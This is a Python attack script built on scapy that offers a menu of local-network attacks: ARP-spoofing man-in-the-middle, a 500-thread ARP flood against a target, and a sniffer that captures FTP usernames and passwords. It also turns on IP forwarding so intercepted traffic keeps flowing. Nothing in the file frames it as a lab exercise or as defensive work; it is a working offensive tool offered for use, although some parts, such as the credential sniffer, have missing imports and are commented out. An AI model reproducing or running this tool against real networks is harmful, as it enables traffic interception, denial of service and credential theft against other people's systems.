#!/usr/bin/env python
import time
import sys
import os
import scapy.all as scapy
from scapy.layers.http import HTTPRequest
import threading

total_packets_sent = 0
lock = threading.Lock()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answ[0][1].hwsrc

def enable_ip_forwarding():
    print ("\n[*] Enabling IP Forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print ("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def arp_spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    print ("\n[*] Restoring Targets...")

    scapy.send(scapy.ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7)
    scapy.send(scapy.ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
    disable_ip_forwarding()
    print ("[*] Shutting Down...")
    sys.exit(1)

def send_arp_requests(target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
    global total_packets_sent
    try:
        while not stop_event.is_set():
            with lock:
                total_packets_sent += 1
                print(f"[+] Packets sent: {total_packets_sent}", end="\r")
                sys.stdout.flush()
            scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=scapy.RandIP()), verbose=False)
    except KeyboardInterrupt:
        stop_event.set()
        print("\nStopping ARP flood attack and restoring network...")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)

def arp_flood(target_ip, target_mac, gateway_ip, gateway_mac, thread_count=500):
    stop_event = threading.Event()
    threads = []

    for _ in range(thread_count):
        thread = threading.Thread(target=send_arp_requests, args=(target_ip, target_mac, gateway_ip, gateway_mac, stop_event))
        thread.start()
        threads.append(thread)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping ARP flood attack.")
        stop_event.set()
        for thread in threads:
            thread.join()
        print("\nRestoring network...")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)

def session_hijacking(interface):
    print("[*] Starting session hijacking...")

    def process_packet(packet):
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = packet[Raw].load.decode(errors='ignore')
                if 'USER' in payload or 'PASS' in payload:
                    print(f"[+] FTP Credentials: {payload.strip()}")

    print("[*] Sniffing on interface:", interface)
    scapy.sniff(iface=interface, store=False, prn=process_packet)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip>")
        sys.exit(1)

    enable_ip_forwarding()
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!] Unable to get gateway MAC address. Exiting..")
        sys.exit(0)
    else:
        print(f"[*] Gateway MAC address: {gateway_mac}")

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!] Unable to get target MAC address. Exiting..")
        sys.exit(0)
    else:
        print(f"[*] Target MAC address: {target_mac}")

    print("1. MITM\n2. ARP Flooding\n3. Session Hijacking")
    attack = input("Pick an attack: ")
    if attack == '1':
        target_2 = input("Enter another victim IP:")
        scapy.arp_mitm(target_ip, target_2)
    elif attack == '2':
        arp_flood(target_ip, target_mac, gateway_ip, gateway_mac)
    elif attack == '3':
        scapy.arp_mitm(target_ip, gateway_ip)
        # interface = input("Enter the network interface to sniff on: ")
        # session_hijacking(interface)
    else:
        print("Invalid choice. Exiting...")
        sys.exit(1)
